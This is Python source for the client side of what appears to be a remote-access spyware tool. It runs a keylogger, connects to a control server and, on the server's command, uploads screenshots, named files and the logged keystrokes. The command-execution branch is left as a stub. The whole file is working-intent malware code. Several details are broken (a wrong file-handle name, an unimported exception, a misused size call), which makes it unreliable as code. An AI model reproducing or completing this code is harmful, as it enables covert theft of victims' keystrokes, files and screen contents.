import io
import json
import os
import socket
import threading

from PIL import ImageGrab

from modules.keylogger import Keylogger

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 1337


def get_screenshot() -> io.BytesIO:
    img = io.BytesIO()
    ImageGrab.grab().save(img, "PNG")
    return img  # take and sent a screenshot of the client machine to the server sending the request


def handle(sock: socket.socket, data: dict) -> None:
    """Handles instructions sent from the server

    Args:
        data (dict): Instruction information
    """
    cmd, args = data.get("cmd"), data.get("args")
    if cmd == "screenshot":
        # get the screenshot image in bytes
        screenshot = get_screenshot()
        # send the size of the screenshot
        sock.sendall(str(screenshot.tell()).encode("utf-8"))
        # send the screenshot data
        sock.sendall(screenshot.getvalue())

    elif cmd == "download":
        # check if the specified file exists
        if os.path.isfile(file_path := args[0]):
            # fetch the file size in bytes
            file_size = os.path.getsize(file_path)
        else:
            # set the file size to 0
            file_size = 0
        # send the file size to the server
        sock.sendall(str(file_size).encode("utf-8"))
        # if the file exists, send the file data
        if file_size > 0:
            with open(file_path, "rb") as f:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    sock.sendall(data)

    elif cmd == "keylogs":
        # send the size of the keylog data to the server and assign it to a variable
        sock.sendall(str(file_size := Keylogger.get_size()).encode("utf-8"))
        # if the size of the keylog data is greater than 0, send the keylog data to the server
        if file_size > 0:
            sock.sendall(keylogger.get_logs())

    elif cmd == "execute":
        pass  # self._execute(data.get("args"))
    elif cmd == "ping":
        # giving arbitrary response notifying the server that the client
        # is still connected and able to receive and send data
        sock.sendall(b"pong")


def connect(sock: socket.socket, host: str, port: int) -> None:
    """Connects to a server

    Args:
        host (str): The host to connect to
        port (int): The port to connect to

    """
    try:
        sock.connect((host, port))
    except OSError:
        return
    while True:
        if not (data := sock.recv(1024)):
            break
        try:
            decoded = json.loads(data.decode("utf-8"))
        except JSONDecodeError:
            continue
        else:
            handle(sock, decoded)


if __name__ == "__main__":
    # start the keylogger
    keylogger = Keylogger()
    keylogger.start()
    # connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        connect(sock, SERVER_ADDRESS, SERVER_PORT)
